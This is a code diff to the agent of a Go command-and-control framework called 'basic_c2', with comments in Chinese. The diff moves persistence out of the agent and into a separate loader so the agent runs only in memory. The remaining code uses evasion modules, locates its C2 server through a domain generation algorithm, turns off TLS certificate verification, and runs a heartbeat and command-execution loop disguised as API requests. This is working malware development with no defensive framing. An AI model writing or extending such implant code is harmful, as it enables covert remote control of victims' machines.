@@ -3,7 +3,6 @@ package main
 import (
 	"basic_c2/agent/commands"
 	"basic_c2/agent/evasion"
-	"basic_c2/agent/persistence"
 	"basic_c2/internal/config"
 	"basic_c2/internal/crypto"
 	"basic_c2/internal/dga"
@@ -25,19 +24,15 @@ func main() {
 		return
 	}
 
-	// 2. 安装持久化
-	if err := persistence.Install(); err != nil {
-		fmt.Printf("[-] 持久化安装失败: %v\n", err)
-	}
-
-	// 3. DGA 域名协商，确定 C2 服务器地址
+	// 2. DGA 域名协商，确定 C2 服务器地址
+	// 注意：持久化已由 Loader 完成，Agent 纯内存运行
 	finalBaseDomain := dga.NegotiateC2(5 * time.Second)
 	finalC2URL := finalBaseDomain + config.C2Endpoint
-	
+
 	fmt.Printf("[+] C2 已锁定: %s\n", finalC2URL)
 	fmt.Println("======== [Agent: C2 Loop Started] ========")
 
-	// 4. 初始化 HTTP 客户端
+	// 3. 初始化 HTTP 客户端
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -46,13 +41,13 @@ func main() {
 		Transport: tr,
 	}
 
-	// 5. 获取主机名
+	// 4. 获取主机名
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "UNKNOWN"
 	}
 
-	// 6. 主循环：心跳与命令执行
+	// 5. 主循环：心跳与命令执行
 	for {
 		// 发送心跳
 		reqData := models.FakeAPIRequest{
